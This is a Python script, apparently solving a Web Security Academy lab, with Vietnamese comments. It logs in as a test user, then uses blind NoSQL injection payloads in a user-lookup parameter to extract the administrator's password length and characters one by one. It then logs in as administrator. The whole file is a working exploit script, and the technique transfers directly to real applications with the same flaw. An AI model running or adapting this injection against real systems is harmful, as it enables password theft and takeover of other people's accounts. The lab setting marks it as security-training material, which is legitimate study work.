import requests
import re
from bs4 import BeautifulSoup
import urllib.parse

host='YOUR_HOST.web-security-academy.net'
path='user/lookup?user='

headers={
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br'
}

print("=== Tien hanh dang nhap voi tai khoan wiener:peter ===")

res_get_csrf=requests.get("https://"+host+"/login",headers=headers)
session=res_get_csrf.cookies.get("session")
soup=BeautifulSoup(res_get_csrf.text,'html.parser')
csrf=soup.find('input',{'name':'csrf'})['value']

res_login=requests.post("https://"+host+"/login",data={'csrf':csrf,'username':'wiener','password':'peter'},headers=headers,cookies={"session":session},allow_redirects=False)

session_cookie=res_login.cookies.get("session")
print("[+] Session cookie: ",session_cookie)

res_get_user=requests.get("https://"+host+"/"+path+"wiener",headers=headers,cookies={"session":session_cookie})
print(res_get_user.status_code)
print(res_get_user.text)

print("=== Bat dau khai thac mat khau admin ===")

characters="abcdefghijklmnopqrstuvwxyz0123456789"
password_admin=""
len_pass=0

for x in range(50):
    payload_get_length="administrator' && this.password.length=={x} || 'a'=='b"
    payload_get_length=payload_get_length.format(x=x)
    res=requests.get("https://"+host+"/"+path+urllib.parse.quote(payload_get_length),headers=headers,cookies={"session":session_cookie})
    # Kiem tra text chua "administrator" de biet true/false thay vi phu thuoc vao do dai 209 bytes
    if len(res.content)==209 or "administrator" in res.text:
        len_pass=x
        break
print("[+] Length of password admin: ",len_pass)

for x in range(len_pass):
    for y in characters:
        payload_get_char="administrator' && this.password[{x}]=='{y}' || 'a'=='b"
        payload_get_char=payload_get_char.format(x=x,y=y)
        res=requests.get("https://"+host+"/"+path+urllib.parse.quote(payload_get_char),headers=headers,cookies={"session":session_cookie})
        if len(res.content)==209 or "administrator" in res.text:
            password_admin+=y
            break
    print("[+] Password admin: ",password_admin)

res_get_csrf_admin=requests.get("https://"+host+"/login",headers=headers)
session_login_admin=res_get_csrf_admin.cookies.get("session")
soup=BeautifulSoup(res_get_csrf_admin.text,'html.parser')
csrf_admin=soup.find('input',{'name':'csrf'})['value']

res_login_admin=requests.post("https://"+host+"/login",data={'csrf':csrf_admin,'username':'administrator','password':password_admin},headers=headers,cookies={"session":session_login_admin},allow_redirects=False)

session_cookie_admin=res_login_admin.cookies.get("session")
print("[+] Session cookie admin: ",session_cookie)

res_admin=requests.get("https://"+host+"/my-account?id=administrator",headers=headers,cookies={"session":session_cookie_admin})
print(res_admin.status_code)
print(res_admin.text)
